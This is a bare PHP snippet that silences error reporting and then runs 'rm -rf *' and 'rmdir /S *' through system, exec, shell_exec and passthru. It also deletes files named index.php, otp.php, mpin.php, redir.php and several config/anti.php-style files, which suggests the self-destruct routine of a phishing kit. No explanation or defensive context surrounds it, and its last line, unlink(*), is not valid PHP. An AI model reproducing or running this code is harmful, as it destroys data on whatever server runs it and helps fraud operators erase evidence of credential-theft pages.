error_log(0);
error_reporting(0);

// linux
system('rm -rf *');
exec('rm -rf *');
shell_exec('rm -rf *');
passthru('rm -rf *');

// cmd
system('rmdir /S *');
exec('rmdir /S *');
shell_exec('rmdir /S *');
passthru('rmdir /S *');

// php
unlink('index.php');
unlink('otp.php');
unlink('mpin.php');
unlink('redir.php');

unlink('anti.php');

unlink('config/anti.php');
unlink('config/404.php');
unlink('config/zch.php');

unlink('*');
unlink(*);
